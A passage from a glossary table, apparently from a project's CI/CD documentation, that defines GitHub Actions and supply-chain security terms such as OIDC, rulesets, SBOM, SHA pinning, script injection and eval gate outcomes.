| **LLM-as-judge** | A second model rating the diagnosis 1-5 against a reference (nightly) |
| **Matrix** | One job template expanded over combinations of values |
| **Multi-arch** | One tag pointing at images for several CPU architectures (amd64, arm64) |
| **NEUTRAL** | Eval gate outcome when no API key is available and results are not cached: exit 0 with a warning |
| **OIDC** | OpenID Connect token a job can request (`id-token: write`) to prove its identity |
| **Path filter** | Run work only when certain files changed (job level here, to keep required checks reporting) |
| **Provenance (SLSA)** | Signed record of how, where and from what commit an artifact was built |
| **Pwn request** | Attack where a privileged workflow executes untrusted PR code |
| **release-please** | Bot that opens a release PR from Conventional Commits and tags releases |
| **Required check** | A check a ruleset demands before merging |
| **Reusable workflow** | A workflow with `on: workflow_call`, called as a job |
| **Ruleset** | Modern branch protection: rules + required checks + bypass list |
| **Run** | One execution of a workflow |
| **Runner** | Machine that executes a job: GitHub-hosted (fresh VM) or self-hosted (your machine) |
| **SARIF** | Standard JSON format for static-analysis results, shown in the Security tab |
| **SBOM** | Software Bill of Materials: list of everything inside an image (SPDX JSON here) |
| **Script injection** | Attacker-controlled `${{ }}` text pasted into a shell script |
| **Secret** | Encrypted value given to jobs (`secrets.NAME`); never to fork or Dependabot PRs |
| **Self-hosted runner** | A runner you operate; dangerous on public repos if PRs can reach it |
| **SHA pinning** | Referencing an action by full commit SHA instead of a movable tag |
| **skipped_no_key** | Eval case status: not cached and no API key to ask the model |
| **Step** | One command (`run:`) or one action (`uses:`) inside a job |
| **Step summary** | Markdown written to `$GITHUB_STEP_SUMMARY`, shown on the run page |
| **Threshold** | Minimum score per eval metric (`evals/thresholds.yaml`) |
| **Trivy** | Vulnerability scanner for files and images |
| **uv / uv.lock** | Python package manager and its hash-locked dependency file |
| **workflow_run** | Event fired when another workflow completes; runs with base-repo privileges |
| **Workflow** | A YAML file in `.github/workflows/` |
| **zizmor** | Security auditor for GitHub Actions workflows |
